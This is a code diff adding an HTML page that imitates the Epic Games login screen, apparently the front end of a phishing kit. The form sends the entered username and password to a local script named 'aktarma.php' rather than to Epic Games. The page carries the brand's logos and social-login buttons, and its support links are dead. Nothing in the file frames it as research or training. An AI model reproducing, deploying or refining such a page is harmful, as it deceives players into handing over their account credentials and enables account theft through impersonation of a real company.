@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="tr" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>EPİC GAMES LOGİN</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" charset="utf-8"></script>
+  </head>
+  <body>
+    <div class="login-form">
+      <div class="logo"><img src="images/logo.png" alt=""></div>
+
+      <div class="social-media">
+        <button class="fb"><img src="images/fb.png" alt=""></button>
+        <button class="google"><img src="images/google.png" alt=""></button>
+        <button class="ps"><img src="images/ps.png" alt=""></button>
+        <button class="xbox"><img src="images/xbox.png" alt=""></button>
+        <button class="switch"><img src="images/switch.png" alt=""></button>
+      </div>
+
+      <h6>Sign In</h6>
+
+      <form action="aktarma.php" method="post">
+        <div class="textbox">
+          <input type="text" name="username" placeholder="Username Or Email">
+          <span class="check-message hidden">Required</span>
+        </div>
+
+        <div class="textbox">
+          <input type="password" name="password"placeholder="Password">
+          <span class="check-message hidden">Required</span>
+        </div>
+
+        <div class="options">
+          <label class="remember-me">
+            <span class="checkbox">
+              <input type="checkbox">
+              <span class="checked"></span>
+            </span>
+            Remember me
+          </label>
+
+          <a href="#">Forgot Your Password</a>
+        </div>
+
+        <input type="submit" value="Log In Now" class="login-btn" disabled>
+        <div class="privacy-link">
+          <a href="#">Privacy Policy</a>
+        </div>
+      </form>
+
+      <div class="dont-have-account">
+        Don't have an Epic Games account?
+        <a href="#">Sign Up</a>
+      </div>
+    </div>
+
+    <script type="text/javascript">
+      $(".textbox input").focusout(function(){
+        if($(this).val() == ""){
+          $(this).siblings().removeClass("hidden");
+          $(this).css("background","#554343");
+        }else{
+          $(this).siblings().addClass("hidden");
+          $(this).css("background","#484848");
+        }
+      });
+
+      $(".textbox input").keyup(function(){
+        var inputs = $(".textbox input");
+        if(inputs[0].value != "" && inputs[1].value){
+          $(".login-btn").attr("disabled",false);
+          $(".login-btn").addClass("active");
+        }else{
+          $(".login-btn").attr("disabled",true);
+          $(".login-btn").removeClass("active");
+        }
+      });
+    </script>
+  </body>
+</html>
